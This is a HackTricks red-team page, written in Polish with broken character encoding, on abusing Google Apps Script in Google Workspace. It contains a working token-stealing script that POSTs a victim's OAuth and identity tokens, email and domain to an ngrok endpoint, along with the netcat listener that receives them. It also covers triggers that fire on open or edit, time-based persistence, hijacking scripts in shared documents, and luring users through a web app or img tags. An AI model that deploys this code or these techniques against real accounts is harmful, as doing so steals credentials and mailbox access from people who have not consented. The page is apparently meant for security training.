# GWS - Skrypty aplikacji

<details>

<summary><strong>Naucz siÄ™ hakowaÄ‡ AWS od zera do bohatera z</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Inne sposoby wsparcia HackTricks:

* JeÅ›li chcesz zobaczyÄ‡ swojÄ… **firmÄ™ reklamowanÄ… w HackTricks** lub **pobraÄ‡ HackTricks w formacie PDF**, sprawdÅº [**PLANY SUBSKRYPCYJNE**](https://github.com/sponsors/carlospolop)!
* ZdobÄ…dÅº [**oficjalne gadÅ¼ety PEASS & HackTricks**](https://peass.creator-spring.com)
* Odkryj [**RodzinÄ™ PEASS**](https://opensea.io/collection/the-peass-family), naszÄ… kolekcjÄ™ ekskluzywnych [**NFT**](https://opensea.io/collection/the-peass-family)
* **DoÅ‚Ä…cz do** ğŸ’¬ [**Grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy telegramowej**](https://t.me/peass) lub **Å›ledÅº** mnie na **Twitterze** ğŸ¦ [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Podziel siÄ™ swoimi sztuczkami hakerskimi, przesyÅ‚ajÄ…c PR-y do** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) na GitHubie.

</details>

## Skrypty aplikacji

Skrypty aplikacji to **kod, ktÃ³ry zostanie uruchomiony, gdy uÅ¼ytkownik z uprawnieniami edytora uzyska dostÄ™p do dokumentu, z ktÃ³rym jest powiÄ…zany Skrypt aplikacji** i po **zaakceptowaniu monitu OAuth**.\
MogÄ… rÃ³wnieÅ¼ byÄ‡ ustawione do **wykonywania siÄ™ co jakiÅ› czas** przez wÅ‚aÅ›ciciela Skryptu aplikacji (Persistencja).

### UtwÃ³rz Skrypt aplikacji

Istnieje kilka sposobÃ³w tworzenia Skryptu aplikacji, chociaÅ¼ najczÄ™stsze to **z dokumentu Google (dowolnego typu)** oraz jako **samodzielny projekt**:

<details>

<summary>UtwÃ³rz projekt powiÄ…zany z kontenerem z dokumentÃ³w Google Docs, Arkuszy kalkulacyjnych lub Prezentacji</summary>

1. OtwÃ³rz dokument Docs, arkusz kalkulacyjny Sheets lub prezentacjÄ™ Slides.
2. Kliknij **Rozszerzenia** > **Skrypty Google Apps**.
3. W edytorze skryptÃ³w kliknij **Bez tytuÅ‚u**.
4. Nadaj swojemu projektowi nazwÄ™ i kliknij **ZmieÅ„ nazwÄ™**.

</details>

<details>

<summary>UtwÃ³rz samodzielny projekt</summary>

Aby utworzyÄ‡ samodzielny projekt w Skrypcie aplikacji:

1. PrzejdÅº do [`script.google.com`](https://script.google.com/).
2. Kliknij **Nowy projekt**.
3. W edytorze skryptÃ³w kliknij **Bez tytuÅ‚u**.
4. Nadaj swojemu projektowi nazwÄ™ i kliknij **ZmieÅ„ nazwÄ™**.

</details>

<details>

<summary>UtwÃ³rz samodzielny projekt z Google Drive</summary>

1. OtwÃ³rz [Google Drive](https://drive.google.com/).
2. Kliknij **Nowy** > **WiÄ™cej** > **Skrypty Google Apps**.

</details>

<details>

<summary>UtwÃ³rz projekt powiÄ…zany z kontenerem z formularza Google Forms</summary>

1. OtwÃ³rz formularz w Google Forms.
2. Kliknij WiÄ™cej more\_vert > **Edytor skryptÃ³w**.
3. W edytorze skryptÃ³w kliknij **Bez tytuÅ‚u**.
4. Nadaj swojemu projektowi nazwÄ™ i kliknij **ZmieÅ„ nazwÄ™**.

</details>

<details>

<summary>UtwÃ³rz samodzielny projekt, korzystajÄ…c z narzÄ™dzia wiersza poleceÅ„ clasp</summary>

`clasp` to narzÄ™dzie wiersza poleceÅ„, ktÃ³re pozwala tworzyÄ‡, pobieraÄ‡/wysyÅ‚aÄ‡ i wdraÅ¼aÄ‡ projekty Skryptu aplikacji z terminala.

Zobacz [Przewodnik po interfejsie wiersza poleceÅ„ za pomocÄ… `clasp`](https://developers.google.com/apps-script/guides/clasp) dla wiÄ™cej szczegÃ³Å‚Ã³w.

</details>

## Scenariusz Skryptu aplikacji <a href="#create-using-clasp" id="create-using-clasp"></a>

### UtwÃ³rz arkusz Google z Skryptem aplikacji

Zacznij od utworzenia Skryptu aplikacji, moja rekomendacja dla tego scenariusza to utworzenie arkusza Google i przejdÅº do **`Rozszerzenia > Skrypty aplikacji`**, co otworzy dla Ciebie **nowy Skrypt aplikacji powiÄ…zany z arkuszem**.

### Wyciek tokena

Aby udzieliÄ‡ dostÄ™pu do tokenu OAuth, musisz kliknÄ…Ä‡ **`UsÅ‚ugi +` i dodaÄ‡ zakresy takie jak**:

* **AdminDirectory**: DostÄ™p do uÅ¼ytkownikÃ³w i grup katalogu (jeÅ›li uÅ¼ytkownik ma wystarczajÄ…ce uprawnienia)
* **Gmail**: DostÄ™p do danych gmaila
* **Drive**: DostÄ™p do danych dysku
* **Google Sheets API**: Aby dziaÅ‚aÅ‚ z wyzwalaczem

Aby samodzielnie **zmieniÄ‡ wymagane zakresy**, moÅ¼esz przejÅ›Ä‡ do ustawieÅ„ projektu i wÅ‚Ä…czyÄ‡: **`PokaÅ¼ plik manifestu "appsscript.json" w edytorze`.**
```javascript
function getToken() {
var userEmail = Session.getActiveUser().getEmail();
var domain = userEmail.substring(userEmail.lastIndexOf("@") + 1);
var oauthToken = ScriptApp.getOAuthToken();
var identityToken = ScriptApp.getIdentityToken();

// Data json
data = {
"oauthToken": oauthToken,
"identityToken": identityToken,
"email": userEmail,
"domain": domain
}

// Send data
makePostRequest(data);

// Use the APIs, if you don't even if the have configured them in appscript.json the App script won't ask for permissions

// To ask for AdminDirectory permissions
var pageToken = "";
page = AdminDirectory.Users.list({
domain: domain,  // Use the extracted domain
orderBy: 'givenName',
maxResults: 100,
pageToken: pageToken
});

// To ask for gmail permissions
var threads = GmailApp.getInboxThreads(0, 10);

// To ask for drive permissions
var files = DriveApp.getFiles();
}


function makePostRequest(data) {
var url = 'http://5.tcp.eu.ngrok.io:12027';

var options = {
'method' : 'post',
'contentType': 'application/json',
'payload' : JSON.stringify(data)
};

try {
UrlFetchApp.fetch(url, options);
} catch (e) {
Logger.log("Error making POST request: " + e.toString());
}
}
```
{% endcode %}

Aby przechwyciÄ‡ Å¼Ä…danie, wystarczy uruchomiÄ‡:
```bash
ngrok tcp 4444
nc -lv 4444 #macOS
```
### Uprawnienia Å¼Ä…dane do wykonania Skryptu aplikacji:

<figure><img src="../../../.gitbook/assets/image (145).png" alt=""><figcaption></figcaption></figure>

{% hint style="warning" %}
Podczas zewnÄ™trznego Å¼Ä…dania zostanie wyÅ›wietlony monit OAuth, ktÃ³ry rÃ³wnieÅ¼ **poprosi o zgodÄ™ na dotarcie do zewnÄ™trznych punktÃ³w koÅ„cowych**.
{% endhint %}

### Tworzenie wyzwalacza

Po otwarciu aplikacji kliknij **â° Wyzwalacze**, aby utworzyÄ‡ wyzwalacz. Jako **funkcjÄ™** wybierz **`getToken`**, uruchamianÄ… podczas wdroÅ¼enia **`Head`**, w ÅºrÃ³dle zdarzenia wybierz **`Z arkusza kalkulacyjnego`**, a typ zdarzenia wybierz **`Przy otwarciu`** lub **`Przy edycji`** (zgodnie z potrzebami) i zapisz.

ZauwaÅ¼, Å¼e moÅ¼esz sprawdziÄ‡ **uruchomienia SkryptÃ³w aplikacji w karcie Wykonania**, jeÅ›li chcesz coÅ› debugowaÄ‡.

### UdostÄ™pnianie

Aby **uruchomiÄ‡** **Skrypt aplikacji**, ofiara musi poÅ‚Ä…czyÄ‡ siÄ™ z dostÄ™pem **Edytora**.

{% hint style="success" %}
**Token** uÅ¼ywany do wykonania **Skryptu aplikacji** bÄ™dzie tym **twÃ³rcy wyzwalacza**, nawet jeÅ›li plik jest otwarty jako Edytor przez innych uÅ¼ytkownikÃ³w.
{% endhint %}

### NaduÅ¼ywanie dokumentÃ³w udostÄ™pnionych wraz ze mnÄ…

{% hint style="danger" %}
JeÅ›li ktoÅ› **udostÄ™pniÅ‚ ci dokument z Skryptami aplikacji i wyzwalaczem korzystajÄ…c z opcji Head** Skryptu aplikacji (a nie z wdroÅ¼eniem staÅ‚ym), moÅ¼esz zmodyfikowaÄ‡ kod Skryptu aplikacji (dodajÄ…c na przykÅ‚ad funkcje kradzieÅ¼y tokenÃ³w), uzyskaÄ‡ do niego dostÄ™p, a **Skrypt aplikacji zostanie wykonany z uprawnieniami uÅ¼ytkownika, ktÃ³ry udostÄ™pniÅ‚ dokument tobie**! (zauwaÅ¼, Å¼e token OAuth wÅ‚aÅ›ciciela bÄ™dzie miaÅ‚ zakresy dostÄ™pu okreÅ›lone podczas tworzenia wyzwalacza).

**Powiadomienie zostanie wysÅ‚ane do twÃ³rcy skryptu wskazujÄ…ce, Å¼e ktoÅ› zmodyfikowaÅ‚ skrypt** (A co powiesz na wykorzystanie uprawnieÅ„ gmail do wygenerowania filtra w celu zapobieÅ¼enia alertowi?)
{% endhint %}

{% hint style="success" %}
JeÅ›li **atakujÄ…cy zmodyfikuje zakresy Skryptu aplikacji**, aktualizacje **nie zostanÄ… zastosowane** do dokumentu, dopÃ³ki nie zostanie utworzony **nowy wyzwalacz** z wprowadzonymi zmianami. Dlatego atakujÄ…cy nie bÄ™dzie mÃ³gÅ‚ ukraÅ›Ä‡ tokenu twÃ³rcy z wiÄ™kszymi zakresami niÅ¼ te, ktÃ³re ustawiÅ‚ w utworzonym przez siebie wyzwalaczu.
{% endhint %}

### Kopiowanie zamiast udostÄ™pniania

Podczas tworzenia Å‚Ä…cza do udostÄ™pnienia dokumentu tworzy siÄ™ Å‚Ä…cze podobne do tego: `https://docs.google.com/spreadsheets/d/1i5[...]aIUD/edit`\
JeÅ›li **zmienisz** koÅ„cÃ³wkÄ™ **"/edit"** na **"/copy"**, zamiast uzyskaÄ‡ dostÄ™p, Google zapyta, czy chcesz **wygenerowaÄ‡ kopiÄ™ dokumentu:**

<figure><img src="../../../.gitbook/assets/image (146).png" alt=""><figcaption></figcaption></figure>

JeÅ›li uÅ¼ytkownik utworzy kopiÄ™ i uzyska do niej dostÄ™p, **zawartoÅ›Ä‡ dokumentu i Skrypty aplikacji zostanÄ… skopiowane**, jednak **wyzwalacze nie**, dlatego **nic nie zostanie wykonane**.

### UdostÄ™pnianie jako aplikacja internetowa

ZauwaÅ¼, Å¼e moÅ¼liwe jest rÃ³wnieÅ¼ **udostÄ™pnienie Skryptu aplikacji jako aplikacji internetowej** (w Edytorze Skryptu aplikacji, wdroÅ¼ jako aplikacjÄ™ internetowÄ…), ale pojawi siÄ™ taki alert:

<figure><img src="../../../.gitbook/assets/image (148).png" alt=""><figcaption></figcaption></figure>

NastÄ™pnie pojawi siÄ™ **typowy monit OAuth pytajÄ…cy** o wymagane uprawnienia.

### Testowanie

MoÅ¼esz przetestowaÄ‡ zebrany token, aby wyÅ›wietliÄ‡ maile za pomocÄ…:

{% code overflow="wrap" %}
```bash
curl -X GET "https://www.googleapis.com/gmail/v1/users/<user@email>/messages" \
-H "Authorization: Bearer <token>"
```
{% endcode %}

Lista kalendarza uÅ¼ytkownika:
```bash
curl -H "Authorization: Bearer $OAUTH_TOKEN" \
-H "Accept: application/json" \
"https://www.googleapis.com/calendar/v3/users/me/calendarList"
```
## Skrypt aplikacji jako trwaÅ‚oÅ›Ä‡

JednÄ… z opcji trwaÅ‚oÅ›ci byÅ‚oby **utworzenie dokumentu i dodanie wyzwalacza dla funkcji getToken** oraz udostÄ™pnienie dokumentu atakujÄ…cemu, aby za kaÅ¼dym razem, gdy atakujÄ…cy otworzy plik, **wyciekÅ‚ token ofiary**.

MoÅ¼liwe jest rÃ³wnieÅ¼ utworzenie skryptu aplikacji i ustawienie wyzwalacza co X czasu (na przykÅ‚ad co minutÄ™, godzinÄ™, dzieÅ„...). AtakujÄ…cy, ktÃ³ry **skompromitowaÅ‚ dane uwierzytelniajÄ…ce lub sesjÄ™ ofiary, mÃ³gÅ‚by ustawiÄ‡ wyzwalacz czasowy skryptu aplikacji i ujawniÄ‡ bardzo uprzywilejowany token OAuth codziennie**:

Po prostu utwÃ³rz skrypt aplikacji, przejdÅº do Wyzwalaczy, kliknij Dodaj wyzwalacz i wybierz jako ÅºrÃ³dÅ‚o zdarzenia Wyzwalany czasem, a nastÄ™pnie wybierz opcje, ktÃ³re najlepiej Ci odpowiadajÄ…:

<figure><img src="../../../.gitbook/assets/image (147).png" alt=""><figcaption></figcaption></figure>

{% hint style="danger" %}
Spowoduje to wysÅ‚anie alertu bezpieczeÅ„stwa e-mailem oraz powiadomienie push na Twoim urzÄ…dzeniu mobilnym o tym.
{% endhint %}

### Pomijanie niezweryfikowanego monitu o udostÄ™pnionym dokumencie

Co wiÄ™cej, jeÅ›li ktoÅ› **udostÄ™pniÅ‚** Ci dokument z **uprawnieniami edytora**, moÅ¼esz generowaÄ‡ **skrypty aplikacji wewnÄ…trz dokumentu**, a **WÅAÅšCICIEL (twÃ³rca) dokumentu bÄ™dzie wÅ‚aÅ›cicielem skryptu aplikacji**.

{% hint style="warning" %}
Oznacza to, Å¼e **twÃ³rca dokumentu bÄ™dzie widoczny jako twÃ³rca dowolnego skryptu aplikacji**, ktÃ³ry ktokolwiek z uprawnieniami edytora utworzy wewnÄ…trz niego.

Oznacza to rÃ³wnieÅ¼, Å¼e **skrypt aplikacji bÄ™dzie zaufany przez Å›rodowisko Workspace** twÃ³rcy dokumentu.
{% endhint %}

{% hint style="danger" %}
Oznacza to rÃ³wnieÅ¼, Å¼e jeÅ›li **skrypt aplikacji juÅ¼ istniaÅ‚** i ludzie **udzielili dostÄ™pu**, kaÅ¼dy z uprawnieniami **Edytora** w dokumencie moÅ¼e go **modyfikowaÄ‡ i naduÅ¼ywaÄ‡ tego dostÄ™pu**.\
Aby to naduÅ¼yÄ‡, konieczne jest rÃ³wnieÅ¼, aby ludzie wywoÅ‚ali skrypt aplikacji. I jednym sprytnym trikiem jest **opublikowanie skryptu jako aplikacji internetowej**. Gdy **ludzie**, ktÃ³rzy juÅ¼ **udzielili dostÄ™pu** do skryptu aplikacji, odwiedzÄ… stronÄ™ internetowÄ…, wywoÅ‚ajÄ… **skrypt aplikacji** (to rÃ³wnieÅ¼ dziaÅ‚a za pomocÄ… tagÃ³w `<img>`).
{% endhint %}
